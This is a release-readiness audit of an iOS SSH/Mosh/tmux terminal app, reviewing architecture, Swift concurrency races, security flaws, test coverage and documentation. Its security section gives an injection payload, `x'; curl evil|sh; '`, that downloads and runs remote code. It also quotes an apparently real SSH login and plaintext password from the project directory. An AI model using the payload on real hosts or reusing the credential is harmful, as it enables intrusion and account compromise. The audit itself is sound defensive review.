# Beacon — Open-Source Release Readiness Audit

*iOS SSH/Mosh/tmux terminal client with the "Vibe Island" agent-monitoring widget · SwiftUI · iOS 18 · xcodegen*

---

## Executive Summary

Beacon is a genuinely strong codebase carrying a small number of sharp, well-understood problems. The engineering core is impressive for a solo project: a clean-room AES-128-OCB3 mosh implementation validated against RFC 7253 known-answer vectors, an actor-based transport layer with deliberate FIFO-ordering primitives, protocol seams that make hard boundaries (SSH, keychain, tmux) testable without a live server, and — most distinctively — a comment culture that documents *why* code is shaped the way it is, anchored to the exact bugs each guard prevents. The tmux control-mode layer and the mosh crypto/wire primitives are thoroughly unit-tested. This is not a prototype; it is a working, thoughtfully-built product.

What holds it back from a public release is a cluster of a few high-severity items that are mostly **cheap to fix but absolutely gating**. The single biggest blocker is legal, not technical: there is **no LICENSE file**, which means the moment the repo goes public it is "all rights reserved" — nobody may legally fork, modify, or contribute, so it is not actually open source at all. Right behind it sits the most serious *engineering* defect: host-key TOFU trust is process-global mutable state on an `SSHService.shared` singleton, and the mosh sidecar installs an unconditional auto-accept into that shared slot — under concurrent connects this can silently trust an unknown host key with no prompt, a real trust-on-first-use bypass in a security-sensitive terminal client. Compounding the first impression, the top-level docs describe a *different, defunct app* ("Vosh") with build commands that fail on the first line and a paywall that was deleted; there is no CI; and a live SSH password plus session cookies physically sit in the working tree.

The through-line is encouraging: nearly every problem is either a documentation/hygiene gap or a case of a proven internal pattern (per-connection delegates, the `moshWriteChain` serializer, protocol seams) simply not being applied consistently. The remediation is mostly "finish what you started," not "rebuild." A focused week or two on the quick wins and the two high-severity code fixes would move this from "impressive private project" to a credible open-source debut.

---

## 1. Architecture & Modularity

### High severity

**Forked SwiftTerm pinned by a bare commit hash, with 8 undocumented patches.**
`project.yml`, `Package.resolved`, `PROJECT.md`, `README.md`
The terminal engine depends on `github.com/Cluas/SwiftTerm` pinned to raw revision `69829cf`, carrying eight behavioral patches (OSC-8 underline, plain-URL linkification via a new public API, IME/marked-text rendering, `deleteBackward`-during-composition, `isRowWrapped`) described only in a ~60-line `project.yml` comment. There is no `PATCHES.md`, no upstream PR links, and no rebuild story — and the checked-in docs actively contradict reality (`PROJECT.md` claims upstream migueldeicaza v1.13; `README` still says "Vosh"). A bare-hash pin silently breaks on force-push or GC, and a contributor cannot tell what diverges from upstream or whether to trust the pin.
**Fix:** Land each patch as a tagged commit on a named fork branch and pin `project.yml` to a fork *tag*, not a hash. Add `docs/PATCHES.md` enumerating each patch, its upstream applicability, and a PR link (open the PRs — several look upstream-mergeable). Record the fork rationale and revert-when-landed plan in `CONTRIBUTING.md`. Fix the docs to name the fork.

**`SessionHub` is a 1,250-line `@MainActor` god-object fusing 6+ responsibilities.**
`Beacon/Services/SessionHub.swift`
It owns the session registry, tri-transport orchestration (SSH single-pane, real mosh UDP, tmux `-CC`, *and* a mosh+tmux sidecar over a second SSH), reconnect/keepalive/scenephase lifecycle, low-level byte math (`wheelBytes`, `moshCopyKeys`, prefix resolution), the `DegradeNotice` UI banner, metrics mirroring, and the `SwiftTerminalView.Coordinator`. The four transport permutations interleave through `start()`/`startMosh()`/`fallbackToSSH()`/`attachMoshTmux()` with hand-rolled task-handle bookkeeping (`moshTmuxAttachTask`, `moshWriteChain`, `isStopping`, `isReconnecting`) papering over races the tangle creates.
**Fix:** Extract a `Transport` strategy protocol with `SSHTransport`/`MoshTransport`/`TmuxControlTransport`/`MoshTmuxSidecar` conformers, each owning its own bootstrap/teardown/handles; leave `SessionHub` a thin registry + lifecycle coordinator. Move the pure `nonisolated static` byte functions into a framework-free `TerminalInputCodec`. Move `DegradeNotice` to the UI layer.

**Host-key TOFU handlers are mutable actor-wide state on `SSHService.shared` — a last-writer-wins race.**
`Beacon/Services/SSHService.swift`, `Beacon/Services/SessionHub.swift`, `Beacon/ViewModels/TerminalViewModel.swift`
`onUnknownHost`/`onChangedHost` are single mutable properties set via `setHostKeyHandlers()`. Both `TerminalViewModel.installHostKeyHandlers()` and the sidecar bootstrap (`SessionHub.swift:858`) mutate the *same* process-wide instance, so overlapping connects clobber each other's prompt closures — the exact "switch to mosh+tmux, screen never loads" bug the `moshTmuxAttachTask` handle now works around. (This is also the root of the high-severity security finding in §4.)
**Fix:** Pass TOFU handlers as parameters to `connect(_:onUnknown:onChanged:)` so each handshake carries its own. Retire/narrow `SSHService.shared` in favor of the instance already threaded through `BeaconApp`.

**MVVM is half-applied: the Terminal *view* is the integration layer across three transports.**
`Beacon/UI/Terminal/TerminalScreen.swift`, `Beacon/ViewModels/TerminalViewModel.swift`, `Beacon/Services/SessionHub.swift`
`TerminalViewModel` is clean — but only for the non-tmux SSH path. There is no view model for tmux/mosh, so `TerminalScreen` (1,645 lines) branches directly across `active.viewModel`/`tmuxController`/`moshControl`/`moshTransport`/`coordinator` and drives lifecycle itself. The largest, most user-critical screen therefore knows the whole transport matrix and is the hardest thing in the app to test.
**Fix:** Introduce one `TerminalSessionViewModel` presenting a uniform surface (status, active view, snapshot, send/scroll/resize, lifecycle) regardless of transport, delegating to the transport strategies above.

### Medium severity

**Service actors import UIKit/SwiftUI and own presentation policy.** `Beacon/Services/SessionHub.swift`, `Beacon/Services/Tmux/TmuxSessionController.swift`
`SessionHub` imports UIKit and owns `DegradeNotice`; `TmuxSessionController` imports SwiftUI+UIKit and embeds notices/flash, immersive-zoom decisions, and status-bar suppression alongside legitimate protocol state — so these "services" can't run headless. Notably the sibling `TmuxControlClient` gets it right with an explicit "no SwiftUI/Observation, no state ownership" contract. **Fix:** Keep transport/state types Foundation-only; move color/`UIApplication`/notice presentation into the UI layer as plain data/enums.

**Dependency injection mixes four styles, with duplicated `KeychainService` instances.** `Beacon/App/BeaconApp.swift`, `Beacon/Services/SSHService.swift`, `Beacon/Models/AppSettings.swift`
`@Environment` vs init-passing vs `.shared` singletons vs `Holder` wrapper classes all coexist; `AppSettings.shared` is read both as a singleton and injected. Three separate `KeychainService()` instances exist (BeaconApp, `KeychainServiceHolder`, `SSHService.shared`'s private one), so which keychain a caller hits depends on its injection path, and the secret cache lives inside one of them. **Fix:** One composition root in `BeaconApp.init` constructs each service once; drop parallel `.shared` singletons; make `KeychainService` a single shared instance; standardize on the `Holder` bridge for non-Observable/actor types.

**`TmuxSessionController` (1,970 lines) fuses state, view-minting, hook polling, and window policy** — despite a clean parser split below it. `Beacon/Services/Tmux/TmuxSessionController.swift`
`TmuxControlClient` is a pure parser with an anti-responsibilities contract, but the controller absorbs snapshot ownership, lazy `TerminalView` minting + per-pane coordinator registry, the Phase-B agent-hook poll/parse bridge, copy-mode input, zoom/pin policy, and command enqueue. The agent-hook bridge in particular is coupled only by convenience. **Fix:** Extract a `PaneViewRegistry`, an `AgentHookBridge`, and a `ZoomPolicy` helper; keep the controller as snapshot owner + command dispatcher.

**No accurate top-level architecture/build/contribution docs; existing ones describe the pre-rebrand app.** `README.md`, `PROJECT.md`, `Signing.xcconfig`, `project.yml`
(Detailed in §6.) A newcomer cannot correctly build (no mention of xcodegen or the git-ignored `Signing.xcconfig`) or understand the SSH/mosh/tmux/Island layering. **Fix:** Rewrite `README`, add `ARCHITECTURE.md`, add `CONTRIBUTING.md` carrying the fork-patch story.

> ✅ **Positive — preserve this: the widget extension boundary is clean and well-reasoned.**
> `Beacon/Island/*`, `BeaconIsland/BeaconStatusWidget.swift`, `project.yml`
> `BeaconIsland` does not duplicate app logic. The three genuinely-shared types compile into both targets, and the two update mechanisms are correctly matched to context: the Dynamic Island Live Activity is **push**-updated via ActivityKit, while the home/lock-screen WidgetKit timeline **pulls** an App-Group JSON snapshot the app writes on every monitor sync (with a `WidgetCenter.reloadAllTimelines()` nudge), and the `Codable` snapshot tolerates older payloads. One fragility: shared files are wired in by hand-listed paths, so a future shared file is silently omitted. **Harden by** promoting the three shared files into a dedicated `BeaconShared` framework both targets depend on.

---

## 2. Code Quality & Swift Idioms

> ✅ **Positive — the single strongest quality signal in the repo: WHY-focused comments tied to real bugs.**
> `Beacon/Services/SessionHub.swift`, `Beacon/Services/Tmux/TmuxSessionController.swift`, `Beacon/UI/DesignTokens.swift`, `Beacon/Services/SSHService.swift`
> Comments explain *why*, anchored to a concrete failure: `SessionHub` documents the exact race each guard closes and the `moshWriteChain` FIFO rationale; `TmuxSessionController` opens with a "### Contract (do not break)" block; `DesignTokens` explains why gradients are `static var` not `static let` ("the exact bug that left BeaconMark's icon stuck on the default theme"); `SSHService` explains why a wrong password surfaces as `allAuthenticationOptionsFailed`. This turns hard-won concurrency/transport knowledge into durable documentation. **Preserve as house style; codify it in `CONTRIBUTING.md`.** The one caution: a comment describing behavior that no longer exists is worse than none (see the dead-code finding) — keep comments tied to live code through refactors.

> ✅ **Positive — layered, user-facing error handling with central raw-error translation.**
> `Beacon/Services/SSHService.swift`, `Beacon/Services/KeychainService.swift`, `Beacon/ViewModels/TerminalViewModel.swift`
> `SSHError`/`KeychainError` are typed enums with human-written localized descriptions; `SSHError.map(_:)` centralizes translating raw Citadel/NIO errors into the friendliest case; `KeychainError.init(osStatus:)` maps `OSStatus` to semantic cases. Failures propagate as meaningful, testable values the UI keys alerts off cleanly. **Route future failure surfaces (e.g. the TODO ECDSA P-384/P-521 support) through the same `map`/`unsupportedKeyType` path.**

> ✅ **Positive — consistent testability seams via protocol injection.**
> `Beacon/Services/SSHService.swift`, `Beacon/Services/KeychainService.swift`, `Beacon/Services/Tmux/TmuxControlling.swift`
> Every hard boundary is fronted by a narrow protocol with a production impl and a documented mock seam: `SSHClientProvider` (no socket in tests), `KeychainBackend` (in-memory), `TmuxTransport` (`MockTmuxTransport`). Deliberately test-first, matching the maintainer's automated-testing preference. **Mention in docs so contributors inject through these rather than reaching for `SSHService.shared`/real keychain in tests.**

### Medium severity

**Duplicated transport-bootstrap blocks in `SessionHub.ActiveSession`.** `Beacon/Services/SessionHub.swift`
The SSH byte-pump is verbatim at ~499–506 and ~728–735; the tmux `-CC` boot (controller construction, `configureAppearance`, `setInitialClientSize`, `beginControlMode`, and the `history-limit 50000 … -CC attach` boot string) is near-identical between `start()` (~475–497) and `fallbackToSSH()` (~713–726), with the boot string appearing a third time (~884); the window-size unpin loop is duplicated in `stop()` (~910, ~934); the grid-seed appears four times. A future fix risks landing in one copy only. **Fix:** Extract `startPlainPump(over:)`, `bootTmuxControl(over:appearance:grid:)`, `seedGrid()`, and a `tmuxBootLine` builder.

**Dead property + stale doc comment in `TerminalViewModel`.** `Beacon/ViewModels/TerminalViewModel.swift`
`@ObservationIgnored private var pumpTask` is only ever read to be cancelled in `disconnect()` — never assigned; the real pump lives on `SessionHub.ActiveSession.pumpTask`. Worse, `disconnect()`'s comment claims it "cancels any pump task the view installed via `pumpTask`" — machinery that no longer exists. Given how strong the comments otherwise are, this actively misleads. **Fix:** Delete the property and rewrite the comment to state what `disconnect()` actually does.

### Low severity

**Third-generation naming leftovers (Mosaic / Moshi / Attach).** `Beacon/App/BeaconApp.swift`, `Beacon/UI/Home/AttachHomeView.swift`
Launch/seed args are still `-MOSAIC_*` (matched across `scripts/smoke-localhost.sh`, `scripts/verify-e2e-mosh-tmux.sh`, `BeaconUITests/MainFlowUITest.swift` — ~15 refs); the primary home screen type is `AttachHomeView` (named after the reference app). Three brand names in one tree reads as unfinished. **Fix:** One atomic sweep renaming `-MOSAIC_*` → `-BEACON_*` (app + scripts + UITests together), and `AttachHomeView` → `HomeView`/`ConnectionsView`.

**Design-token system bypassed by ~30 inline `Color.white/black.opacity` magic values.** `Beacon/UI/Components.swift`, `Beacon/UI/Home/AttachHomeView.swift`
The documented `Ink` palette is undercut by ~30 hardcoded opacities, some duplicating existing tokens (0.045 ≈ `sshPillBG`, 0.075 ≈ `hairline`). A palette tweak for release would miss all of them. **Fix:** Promote recurring values to named `Ink` tokens (`Ink.chipBGSubtle`, `Ink.overlayBorder`) and replace call sites.

**Terminal-theme resolution duplicated across three views.** `TerminalScreen.swift`, `AttachHomeView.swift`, `SettingsScreen.swift`
`TerminalTheme.allThemes.first { $0.id == settings.themeId } ?? .githubDark` is copy-pasted three times; the default is expressed two ways that can drift. **Fix:** Add `AppSettings.currentTerminalTheme` (or `TerminalTheme.resolve(id:)`) and call it everywhere.

**A few files carry most of the complexity.** `TmuxSessionController.swift` (~1,970), `TerminalScreen.swift` (~1,645), `SessionHub.swift` (~1,252), `AttachHomeView.swift` (~1,194). Cohesive, not junk-drawers, but a navigability/onboarding barrier and a merge-conflict surface. **Fix:** Split by concern into same-type Swift extensions in separate files (zero-cost): e.g. `TmuxSessionController` → `+Discovery`/`+Notifications`/`+Sending`/`+Terminals`.

**Lone unstructured `print()` and no logging abstraction.** `Beacon/App/BeaconApp.swift`
Exactly one `print` exists (the test-only smoke-seed diagnostic); the codebase is otherwise admirably free of debug scaffolding (no `NSLog`, `try!`, `fatalError`, commented-out code). The gap is there's no logging facility, so the one place that wants to report a failure falls back to `print`. **Fix:** Add a minimal `os.Logger` category (`Log.ssh`, `Log.smoke`) or drop the print (it's a test-only path).

---

## 3. Swift Concurrency Safety

### High severity

**Shared host-key TOFU handler state races across concurrent connects — can auto-trust the wrong host key.**
`Beacon/Services/SSHService.swift`, `Beacon/Services/SessionHub.swift`, `Beacon/ViewModels/TerminalViewModel.swift`
`SSHService.shared` stores one pair of prompt closures (`:325-327`). `installHostKeyHandlers()` and `connect()` are two separate awaits, and `connect()` only reads the handlers when it builds the `TOFUHostKeyDelegate` (`:404-407`) *after* install returns — so another connect's `setHostKeyHandlers` can interleave in the gap. The mosh sidecar deliberately installs an **auto-accept-unknown** policy (`SessionHub:858-860`) right before its own connect: if the user connects a brand-new host B while server A's sidecar bootstraps, B's handshake can read A's auto-accept closure and silently trust B's unknown key with **no TOFU prompt**. The maintainer documented this hazard in commit `421a904` but only mitigated one teardown path with `isStopping`; the root cause is unfixed. (Full security treatment in §4.)
**Fix:** Pass per-connection TOFU handlers into `connect()` (captured atomically with the handshake); scope the sidecar's auto-accept to its own delegate, or delete it entirely (the sidecar host was TOFU-trusted moments earlier, so the normal handler already resolves `.trusted`).

### Medium severity

**Mosh scroll/wheel writes bypass `moshWriteChain` and reorder against keystrokes.** `Beacon/Services/SessionHub.swift`
`moshWriteChain` exists specifically because "independently-spawned tasks have no ordering guarantee" (`:266-277`), yet both scroll paths send via bare `Task { await transport.send(...) }` outside it — the wheel branch (`:305`) and `moshCopyScroll` (`:337`). The actor serializes each `send`, but the *order* two independently-spawned tasks enter the actor is undefined, so a chained keystroke and a bare-Task scroll race — reintroducing the FIFO class of bug the chain was built to eliminate. **Fix:** Route scroll/wheel through `moshWriteChain` the same way `sendInput` does.

**Mosh resume/sidecar-rebuild has no reentrancy guard — overlapping resumes can double-build the sidecar and leak an SSH connection.** `Beacon/Services/SessionHub.swift`
`reconnect()` guards the SSH rebuild with `isReconnecting` (`:982`), but `resumeIfNeeded()`'s mosh sidecar-rebuild block (`:1007-1036`) has none across many awaits. `setForeground(true)` fires `resumeAll` and then arms a 12s keepalive whose tick also calls `resumeIfNeeded`; a slow rebuild or rapid background/foreground toggling lets a second entry observe the dead sidecar, both run `startMoshControlPlane()`, both assign `moshControl`/`sidecarSSH` — one SSH connection is orphaned. **Fix:** Guard the mosh branch with an `isReconnecting`-style flag, or funnel all resume/reconnect work through one serialized task.

**`MoshTransport.receiveNext()` spawns datagram handling and the next receive as two independent tasks — drops in-order processing and backpressure.** `Beacon/Services/Mosh/MoshTransport.swift`
`:261-271` schedules `Task { handleDatagram(data) }` and separately `Task { receiveNext() }`. The actor serializes state but not submission order, so datagram N+1 can be handled before N, and the SSP apply logic is order-sensitive (`appliedHostNum` advances only when `oldNum == appliedHostNum`, `:296`) — manifesting as spurious gap events and extra re-diff round-trips, plus loss of backpressure under a flood. Not corrupting (mosh tolerates real reordering) but self-inflicted. **Fix:** Drive the receive loop from a single actor-owned task that awaits `handleDatagram` before re-arming the next receive.

### Low severity

**`moshTmuxAttachTask` cancellation checks `isStopping`, not `Task.isCancelled` — so `cancel()` is ineffective on the reconnect path.** `Beacon/Services/SessionHub.swift`
`stop()` cancels the task (`:893`) but its interior aborts all check `guard !isStopping`, which only `disconnect()` sets — not `reconnect()`, which also calls `stop()`. On reconnect the retry loops spin through all iterations, and `startMoshControlPlane`'s post-connect `guard !isStopping` (`:866`) passes, so a late-completing handshake still assigns `sidecarSSH`/`moshControl` — the exact leak the commit meant to prevent. Largely unreachable today (mosh short-circuits before `reconnect()`), but fragile. **Fix:** Honor `Task.isCancelled`/`checkCancellation()` at each loop iteration and right after the SSH connect.

**`TmuxSessionController.detach()` leaves `writeChain` and the `pendingCallbacks` response-FIFO intact.** `Beacon/Services/Tmux/TmuxSessionController.swift`
`detach()` (`:231-238`) cancels pumps and resets the parser but doesn't clear `writeChain` or `pendingCallbacks`. Controllers are discarded after detach today, so no live bug — but if one were ever re-attached, stale callbacks would desync the entire command-response FIFO. **Fix:** In `detach()`, clear `pendingCallbacks`, cancel/nil `writeChain`, and drop queued-but-unflushed commands so a detached controller is a clean slate.

> ✅ **Positive — the ordering primitives already exist and work; the findings above are "apply them consistently."**
> `TmuxSessionController` funnels every parser callback through one `AsyncStream` with one `@MainActor` consumer to restore end-to-end FIFO (`:1373-1424`); both `enqueue` (`:1865`) and `TerminalViewModel.send` (`:182`) serialize writes through an await-previous chain; `moshWriteChain` is the same idea for mosh keystrokes; the repeat-timer hardening gates on `applicationState == .active`; round-trips are timeout-bounded (`withTimeoutValue`, `flushControlChannel`). **Adopt these everywhere bytes reach a transport or state is rebuilt, and add a review-checklist item forbidding new bare `Task { await transport.send(...) }` / unguarded async rebuild blocks.**

---

## 4. Security

### High severity

**TOFU bypass: unknown host keys can be silently auto-accepted through the shared `SSHService` singleton.**
`Beacon/Services/SessionHub.swift`, `Beacon/Services/SSHService.swift`, `Beacon/ViewModels/TerminalViewModel.swift`, `Beacon/Services/HostKeyValidator.swift`
Host-key trust is process-global mutable state (`onUnknownHost`/`onChangedHost`, `SSHService.swift:325-358`). The mosh+tmux control plane installs an unconditional auto-accept: `setHostKeyHandlers(onUnknown: { _,_,_ in true }, onChanged: { _,_,_,_ in false })` (`SessionHub.swift:858-860`). Because install and connect are separate awaits on the shared actor and Beacon runs concurrent sessions plus background reconnect/keepalive timers, a session-A install can land between session-B's `installHostKeyHandlers()` and its `connect()` — so B's handshake to a genuinely new host reaches `validateHostKey` while the global handler is auto-accept, and the unknown key is trusted and persisted with **no prompt** (`HostKeyValidator.swift:203-206`). Under an active MITM on a new host during that window the fraudulent key is silently accepted. Note the maintainer's specific question: **CHANGED keys are *not* auto-accepted** (`onChanged` stays deny) — only UNKNOWN keys leak. The auto-accept is also unnecessary: the sidecar host was TOFU-trusted moments earlier, so the decision is already `.trusted` and no handler fires.
**Fix:** Make trust decisions per-connection — pass the closures (or a `TOFUHostKeyDelegate`) into `connect()` so each handshake carries its own with no cross-session leakage. **Delete** the `onUnknown: { true }` auto-accept. Add a concurrency test interleaving a sidecar connect with a fresh-host connect that asserts the fresh host still prompts.

### Medium severity

**E2E smoke-seed path is compiled into release builds and plants a no-biometry private key.** `Beacon/App/BeaconApp.swift`
`applySmokeSeedIfRequested()` (`:207-255`) is **not** wrapped in `#if DEBUG` (zero `#if DEBUG` in the file). In every build, launch args `-MOSAIC_SEED_USER`/`-MOSAIC_SEED_KEY_B64` cause the app to base64-decode a PEM key and save it with `requireBiometry: false` (`:223`), **delete all existing connections** (`:245-247`), create a connection, and auto-open a terminal. A hidden production flag plants an attacker-supplied key that bypasses the biometric gate and wipes user data. Exploitability is limited (launch args need debugger/MDM/jailbreak), hence medium — but it's needless attack surface. **Fix:** Wrap the entire smoke-seed feature (and the `-MOSAIC_RESET` wipe at `:200-202`) in `#if DEBUG`; the smoke scripts run debug builds, so CI is unaffected.

**Real credentials and live session cookies in the repo working tree.** `secret.md`, `cookies.json`
`secret.md` contains `cluas@192.168.2.222 Imyuols123`; `cookies.json` has live xiaohongshu.com session cookies. Both are `.gitignore`d and confirmed absent from git history — so they won't ship via git. But they physically sit in the project directory, and a distributed archive/tarball does not honor `.gitignore`. **Fix:** Delete both from the working tree, rotate the `Imyuols123` password and the xiaohongshu session (treat as compromised), and add a `git archive`-based packaging step so ignored files can't be bundled.

**tmux/shell command injection via server-controlled session names and pane/window IDs.** `Beacon/Services/SessionHub.swift`, `Beacon/Services/Tmux/TmuxSessionController.swift`
The tmux session name (from the remote, `SessionHub:781-784`) is spliced into a shell line typed into the login shell: `"\u{15}\(tmux) attach -t '\(name)'\r"` (`:823`, `:882`). A name containing a single quote (`x'; curl evil|sh; '`) breaks the quoting and runs arbitrary commands on connect. Pane/window/session IDs are interpolated unquoted into `-CC` commands throughout the controller (`select-window -t \(windowId)` `:316`, `send-keys -t \(paneId)` `:619-621`). The user already has a shell, but a compromised/shared multi-user host or a crafted session name set by another party can weaponize this against the connecting user. **Fix:** Validate tmux IDs against strict regexes (`$\d+` / `@\d+` / `%\d+`) and single-quote-escape session names (`'` → `'\''`) before splicing; reject non-matching IDs.

### Low severity

**Cached plaintext secrets bypass the biometric gate for the whole app session.** `Beacon/Services/SSHService.swift`
`resolveSecret` caches the decrypted password/PEM in `secretCache[UUID:String]` after the first biometric read and reuses it until an intentional disconnect (`:334-341`, `:425-448`). Documented as an intentional tradeoff to avoid Face ID on auto-reconnect, but it downgrades the keychain's `.userPresence` "authenticate on every read" to once-per-session; the plaintext lives in process memory across backgrounding. **Fix:** Clear `secretCache` on background (or a short idle TTL) and re-auth on next connect; at minimum document it prominently.

**Known-hosts fingerprints in `UserDefaults` without integrity protection.** `Beacon/Services/HostKeyValidator.swift`
The TOFU map is a JSON blob under `beacon.knownHosts` (`:17-35`) in a container plist with no confidentiality/integrity. A jailbreak or extracted backup could pre-seed a fingerprint so a later MITM'd host is classified `.trusted` and skips the changed-key warning. Defense-in-depth gap presupposing container write access. **Fix:** Store the map in the keychain (data-protection, ThisDeviceOnly) or MAC it with a keychain-held key.

**Bootstrap error embeds up to 400 chars of raw remote output.** `Beacon/Services/Mosh/MoshBootstrap.swift`
`BootstrapError.noConnectLine` inlines up to 400 chars of mosh-server stdout into a user-visible/loggable string (`:22-24`). The session key isn't present on this branch, keeping the leak minor, but arbitrary remote output flowing into error text/crash reports is a hygiene concern. **Fix:** Truncate harder, redact control characters, and confirm no crash-reporting SDK captures these descriptions.

> ✅ **Positive — the crypto is genuinely strong and should be treated as security-critical.**
> `Beacon/Services/Mosh/OCB3.swift`, `MoshCrypto.swift`, `BeaconTests/Services/OCB3Tests.swift`
> The clean-room AES-128-OCB3 impl is validated against RFC 7253 Appendix A KATs (including the accumulating iteration test) and uses constant-time tag comparison (`OCB3.swift:143-147`). Nonce/sequence handling is correct: send seq is a monotone `UInt64` never reset within a session (fresh per-session key), the direction bit separates client/server nonce spaces, and the receive path rejects `direction != .toClient` (`MoshTransport.swift:74,253-255,275`), preventing reflection. No nonce-reuse path found. **Keep the KAT tests in CI; require review on changes to these files.**

> ✅ **Positive — keychain usage and secret-logging discipline are well done.**
> `Beacon/Services/KeychainService.swift`, `Beacon/Services/SSHService.swift`
> Modern data-protection keychain (`kSecUseDataProtectionKeychain`, `WhenUnlockedThisDeviceOnly`, `.userPresence`), a compile-time-gated simulator-only file vault (`#if targetEnvironment(simulator)`) that never ships, Secure Enclave keys handled as opaque handles that never leave the chip, and a single `print` in the whole app with **no** path logging passwords/PEMs/session keys. **Maintain the no-secret-logging invariant (consider a CI grep for `print`/`os_log` near secret variables).**

---

## 5. Test Coverage & CI

### High severity

**No CI whatsoever.** `.github` (absent), `scripts/`
No `.github/workflows`, no fastlane, no Gemfile — nothing verifies that incoming PRs even compile, let alone that the ~244 `@Test` cases across 28 suites pass. For a repo heading to open source this is the single biggest gap. **Fix (highest-leverage single change):** Add a GitHub Actions macOS workflow that runs `brew install xcodegen`, `xcodegen generate`, SPM resolve, and `xcodebuild test -scheme Beacon -sdk iphonesimulator -destination 'platform=iOS Simulator,name=iPhone 17 Pro'`, caching SPM keyed on `Package.resolved`.

**README is stale and wrong — a stranger cannot build from it.** `README.md`, `project.yml`
Still says "Vosh"; tells the reader to build `Vosh.xcodeproj -scheme Vosh`, launch `com.cluas.vosh`, find `Vosh.app`; documents a deleted paywall (`付费墙测试`, `StoreManager._debugProOverride`); lists `Xcode 16+` while `project.yml` pins `26.0`. First command yields "scheme not found." **Fix:** Rewrite for Beacon (correct scheme/bundle id, Xcode 26.0, no paywall) with an explicit clean-checkout sequence.

**The entire live SSH/Mosh/tmux connect path is only exercised by integration tests that silently skip by default.** `BeaconTests/Integration/{SSHIntegrationTests,TmuxIntegrationTests,GoldenPathTests}.swift`
All gated `.enabled(if: isConfigured)` on env vars `VOSH_SSH_USER`/`VOSH_SSH_LOCAL_KEY` (still the pre-rename prefix). Unset by default → Swift Testing marks them *skipped, not failed* — so with no CI the real connect/PTY/echo/tmux-attach path has zero automated verification on any PR. **Fix:** Stand up a localhost sshd+tmux fixture (or container) in CI and export the vars; rename them `BEACON_*` and document them; log a visible warning when the suite skips.

**`SessionHub` — the 1,252-line orchestration core — is essentially untested.** `Beacon/Services/SessionHub.swift`, `BeaconTests/Services/MoshScrollKeysTests.swift`
The only reference in tests is a `typealias` reusing a nested type. Its transport selection, teardown ordering, and reconnect/roaming handoff have no dedicated test — the highest-risk untested surface (central, large, stateful, actor-based). **Fix:** Extract the pure decision logic behind the protocols already in use (`SSHClientProvider`, `MockTmuxTransport`) and unit-test transport-selection and teardown/reconnect first.

### Medium severity

**`MoshTransport`'s datagram/SRTT/roaming state machine has no unit test.** `Beacon/Services/Mosh/MoshTransport.swift`
The actor constructs a concrete `NWConnection` in `init`, so there's no seam to feed synthetic datagrams to `handleDatagram` or drive `handleState`. The wire/crypto primitives beneath it *are* well covered, so the gap is specifically the stateful glue (SRTT smoothing, roaming flips, ready/failed/waiting resume). **Fix:** Introduce a `DatagramChannel` protocol seam so tests inject a fake and assert SRTT convergence, roaming on address change, and resume across `.failed`/`.waiting`.

**Pure, trivially-testable helpers have no tests.** `TmuxLayoutParser.swift`, `PlainLinkDetector.swift`, `SSHKeyFactory.swift`, `AgentActivityMonitor.swift` (+ `TerminalScrollback`, `SessionMetrics`)
`TmuxLayoutParser` is a recursive-descent parser of remote-supplied layout strings — malformed input could crash or misrender the pane UI, with not one case for it. These need no sshd. **Fix:** Add table-driven tests for `TmuxLayoutParser` first (nested/truncated/garbage/deep nesting), then the others — lowest-effort, highest-certainty coverage, doubling as executable grammar docs.

### Low severity

**No toolchain pinning or lint/format config; generated `.xcodeproj` is committed and can drift.** `project.yml`, `Beacon.xcodeproj/project.pbxproj`, `.gitignore`
No Brewfile/Mintfile/`.tool-versions` pinning xcodegen, no `.swiftlint.yml`/`.swiftformat`. `project.yml` is declared source-of-truth yet the full `.xcodeproj` is tracked. **Fix:** Add a Brewfile pinning xcodegen (`brew bundle`), add SwiftFormat/SwiftLint wired into CI, and decide deliberately whether to commit the `.xcodeproj` — either gitignore + always-regenerate, or keep it with a CI check that `xcodegen generate` produces no diff.

> ✅ **Positive — tmux, models, and mosh-crypto layers are thoroughly and well tested.**
> `BeaconTests/Services/{TmuxSessionControllerTests(1,206 LOC),TmuxControlClientParserTests(471),TmuxControlClientEdgeTests(331)}`, `Mocks/MockTmuxTransport.swift`
> Session/window state machines are driven through a proper `MockTmuxTransport` injected via the `TmuxControlling` protocol — tested without a live server. Mosh crypto/wire round-trip real vectors (incl. a known Adler-32). Models, `KeychainService` (in-memory variant), and `HostKeyValidator` (in-memory) are covered. **The problem is reach (SessionHub, transports, UI), not quality — extend the same protocol-seam + in-memory-fixture pattern to the gaps rather than inventing a new one.**

---

## 6. Documentation & Onboarding

### High severity

**No LICENSE file — a legal blocker for any public release.** (repo root)
No `LICENSE`/`COPYING`/header anywhere; no `CONTRIBUTING`, no `CODE_OF_CONDUCT`. Under default copyright, unlicensed published code is "all rights reserved" — nobody may legally fork, modify, or contribute. For an app shipping a patched MIT SwiftTerm fork and depending on Citadel, this is both a legal and good-faith problem. **Fix:** Add MIT or Apache-2.0 (deps are MIT; no GPL linkage — see §7); note the fork's license carries through the patches.

**README is two rebrands stale.** `README.md`, `project.yml` — *(see §5; the doc-side framing:)* Every build/run command is broken (`Vosh.xcodeproj`/scheme/`com.cluas.vosh`), a whole `付费墙测试`/StoreKit/`_debugProOverride` section documents a feature deleted in `480bf18`. The first thing a contributor reads is actively wrong end to end. **Fix:** Rewrite against current `project.yml`; delete the StoreKit/Pro sections; verify each command after `xcodegen generate`.

**`PROJECT.md`'s code map points at files that no longer exist and lists wrong dependency versions.** `PROJECT.md`, `project.yml`
Sends contributors to `Vosh/Services/StoreManager.swift`, `MoshService.swift`, `TmuxManager.swift`, `SpeechService.swift`, `SFTPService.swift`, `VoshApp.swift`, `VoshWidget/` — none exist. Claims Citadel v0.12 and upstream SwiftTerm v1.13 at iOS 17, while `project.yml` pins Citadel from 0.7.0, the Cluas fork by revision, and iOS 18. **Fix:** Delete `PROJECT.md` or regenerate its tree/table from the current layout (transport code in `Services/Mosh` & `Services/Tmux`; `SessionHub` is the orchestrator).

### Medium severity

**No discoverable architecture overview.** `SessionHub.swift`, `.claude/architecture_comparison.md`, `docs/design/host-capabilities.md`
Nothing explains that `SessionHub` is the app-wide orchestrator, the SSH/mosh/tmux relationship, the capability-probe-and-degrade matrix, or the subtle mosh+tmux dual-transport design (mosh UDP renders the TUI while a sidecar SSH carries the tmux `-CC` stream — documented only as an inline comment). The one real architecture doc is buried in `.claude/`, still titled "Vosh." **Fix:** Write `docs/ARCHITECTURE.md` (linked from README) naming `SessionHub`, sketching the transport layering + degrade matrix + dual-transport rationale; promote/rename the tmux control-mode diagram out of `.claude`; add a top-of-file flow comment to `SessionHub.swift`.

